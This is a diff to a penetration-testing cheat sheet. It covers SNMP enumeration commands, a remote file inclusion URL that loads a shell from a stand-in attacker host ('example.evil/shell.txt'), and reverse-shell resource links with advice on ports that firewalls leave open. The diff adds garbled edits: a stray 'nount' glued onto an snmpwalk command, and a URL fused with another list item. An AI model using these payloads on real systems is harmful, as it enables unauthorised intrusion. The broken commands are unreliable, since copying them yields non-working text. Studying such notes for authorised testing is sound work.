@@ -242,7 +242,7 @@ snmpwalk -c public -v1 -t 10 $ip
 snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25
 
 # Enumerate running Windows processes
-snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
+nountsnmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
 
 # Enumerate open TCP ports
 snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3
@@ -399,7 +399,7 @@ http://example.com/index.php?page=http://example.evil/shell.txt%00
 
 ## Reverse Shell payload
 - https://www.revshells.com/ #Reverse Shell Generator
-- https://guide.offsecnewbie.com/shells
+- https://highon.coffee/blog/reverse-shell-cheat-sheet/- https://guide.offsecnewbie.com/shells
 - Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
 - If connections drops or can not be established, try different ports 80,443,8080...
 ```bash
